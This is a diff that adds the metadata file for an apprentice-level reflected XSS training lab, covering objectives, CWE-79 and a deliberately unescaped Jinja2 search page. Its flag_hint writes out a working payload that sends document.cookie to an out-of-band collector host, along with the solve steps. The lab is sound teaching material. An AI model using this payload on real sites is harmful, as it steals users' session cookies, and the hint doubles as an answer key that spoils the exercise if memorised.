@@ -1,0 +1,34 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "reflected-xss-search-noescape",
+  "title": "Reflected XSS in Search Results",
+  "track": "xss",
+  "difficulty": "apprentice",
+  "estimated_minutes": 25,
+  "max_lifetime_minutes": 45,
+  "learning_objectives": [
+    "Identify a reflected XSS sink: a request parameter echoed into an HTML context with no output encoding",
+    "Construct a <script> payload that reads document.cookie in the victim's browser",
+    "Understand the victim-bot delivery model — the payload executes in the admin's session, not yours",
+    "Use an out-of-band collector to exfiltrate the stolen cookie across an egress-dropped network",
+    "Recognise HttpOnly cookies and contextual output encoding as the two independent defences"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": [],
+  "flag_hint": "Submit /?q=<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script> to POST /report; the admin bot visits it carrying its session cookie. Read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "Jinja2 (autoescape disabled on the search render)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": ["xss", "reflected-xss", "cookie-theft", "oob-exfil", "victim-bot", "cwe-79"],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The canonical PortSwigger 'Reflected XSS into HTML context' lab pattern, abstracted for local Docker with a Playwright victim bot and an OOB collector"
+}
